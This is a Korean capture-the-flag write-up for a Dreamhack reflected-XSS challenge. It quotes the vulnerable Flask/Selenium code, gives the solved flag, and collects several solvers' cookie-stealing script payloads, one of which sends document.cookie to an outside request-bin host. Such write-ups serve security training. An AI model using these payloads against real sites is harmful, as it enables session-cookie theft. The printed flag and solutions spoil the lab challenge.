flag=DH{2c01577e9542ec24d68ba0ffb846508e}

def read_url(url, cookie={'name': 'name', 'value': 'value'}):
    cookie.update({'domain':'127.0.0.1'})
    try:
        options = webdriver.ChromeOptions()
        for _ in ['headless', 'window-size=1920x1080', 'disable-gpu', 'no-sandbox', 'disable-dev-shm-usage']:
            options.add_argument(_)
        driver = webdriver.Chrome('/chromedriver', options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get('http://127.0.0.1:8000/')
        driver.add_cookie(cookie)
        driver.get(f'http://127.0.0.1:8000/xss?xss={urllib.parse.quote(url)}')
    except:
        driver.quit()
        return False
    driver.quit()
    return True

이 부분을 보면 xss 시 FLAG가 add_cookie로 인해 쿠키로 저장되는 것을 알수 있다.

Memo를 통해 flag를 봐야하므로 memo에 이 쿠키 값을 더한다.

memo 페이지를 보면 http://host1.dreamhack.games:16816/memo?memo=hello 이런식으로 url요청시 hello가 print 된다.
즉 /memo?memo=cookie가 되면 FLAG를 획득할 수 있다.

그래서 flag 페이지 에서 <script>location.href="/memo?memo="+document.cookie</script>라 요청하면 memo에 FLAG가 print된걸 볼 수 있다.


다른 사람들 답 :
    문제를 보면 /xss에서 xss 로 넘어온 값에 대해 무전건 적으로 리턴을 해주고 있기 때문에 xss 공격이 가능해진다. 
    그리고 /flag 에서 cookie 값으로 flag를 담고 또 xss 넘어간 값을 selenium 을 통해 
    'http://127.0.0.1:8000/xss?xss={urllib.parse.quote(url)}' 와 같은 형태로 접근 하고 있기때문에 
    아래의 Exploit Code를 넘겨주면 memo에서 Flag를 받아낼 수 있다.

    <script>
    document.location.href = `/memo?memo=${document.cookie}`;
    </script>



    이 문제의 핵심은 /flag 페이지에서 'xss’의 데이터를 POST 방식으로 보내게 되면 read_url 함수가 동작하며 여기에 FLAG 변수의 내용이 담긴flag 쿠키가 잠깐 동안 생성된다는 것을 이해하면 풀리게 됩니다.
    그렇다면 어떻게 flag 쿠키의 내용을 들여다볼까요?
    정답은 /memo 페이지를 활용하는 것입니다. 
    /flag 페이지의 'xss’에 '<script>location.href="/memo?memo="+document.cookie;</script>'라고 입력하시면 
    /xss 페이지에 'xss’값이 전달되고 실행되어 /memo 페이지에 잠깐 동안 존재했던 flag 쿠키가 기록됩니다. 
    완료된 뒤 /memo 페이지에 가면 FLAG를 확인할 수 있습니다.


    /flag를 통해서 cookie값을 FLAG로 설정하여 internal로 처리하기 때문에 /xss와 /memo의 기능을 적절히 활용하여 flag를 얻어내야 한다.

    <script>location.href%3d"http%3a//localhost%3a8000/memo%3fmemo%3d"%2bdocument.cookie</script>



    xss는 따로 필터링 없이 리턴을 해버립니다. 따라서 xss 공격이 가능한 거구요.

    맨 처음에 이 페이지 자체를 가지고 뭘 해야되는줄알고 한참을 헤맸습니다…

    이걸 도구로 활용해야된다는 걸 몰랐어유

    다음은 flag입니다. flag는 값을 불러온 뒤 read_url을 통해 실행시킵니다.

    따라서 저 if문 안으로 들어가지 않기 위해서는 read_url이 예외처리되지 않고 잘 실행되야 합니다.

    우선 결론적으로 flag함수에서 플래그 값을 read_url의 쿠키로 전송하고 있기 때문에 이 쿠키값을 확인하면 되지 않을까 싶습니다.

    여기서 크게 두 가지 풀이가 있을 수 있는 것 같습니다.

    listening server를 하나 더 파서 그 서버에 쿠키값을 전송

    memo부분이 값을 출력시켜준다는 점을 이용하여 쿠키값을 memo에 출력

    저는 2번방법을 사용하였습니다.

    xss 공격을 이용하여 위치를 memo로 바꾸고, document.cookie를 넣어 현재 쿠키 값을 출력시키도록 하였습니다.

    <script>location.href="/memo?memo="+document.cookie;</script>




    Vuln Code(app.py)
    def read_url(url, cookie={'name': 'name', 'value': 'value'}):
        cookie.update({'domain':'127.0.0.1'})
        try:
            options = webdriver.ChromeOptions()
            for _ in ['headless', 'window-size=1920x1080', 'disable-gpu', 'no-sandbox', 'disable-dev-shm-usage']:
                options.add_argument(_)
            driver = webdriver.Chrome('/chromedriver', options=options)
            driver.implicitly_wait(3)
            driver.set_page_load_timeout(3)
            driver.get('http://127.0.0.1:8000/')
            driver.add_cookie(cookie)
            driver.get(f'http://127.0.0.1:8000/xss?xss={urllib.parse.quote(url)}')
        except:
            driver.quit()
            return False
        driver.quit()
        return True

    @app.route('/flag', methods=['GET', 'POST'])
    def flag():
        if request.method == 'GET':
            return render_template('flag.html')
        elif request.method == 'POST':
            xss = request.form.get('xss')
            if not read_url(xss, {'name': 'flag', 'value': FLAG}):
                return '<script>alert("wrong??");history.go(-1);</script>'

            return '<script>alert("good");history.go(-1);</script>'
    flag페이지에서 read_url을 호출한다.
    cookie에 FLAG를 저장한다.
    requestbin.com에서 임의의 서버를 생성하고 <script>document.location='https://enw6o0wtab9.x.pipedream.net/?param='+document.cookie</script>페이로드를 입력한다.






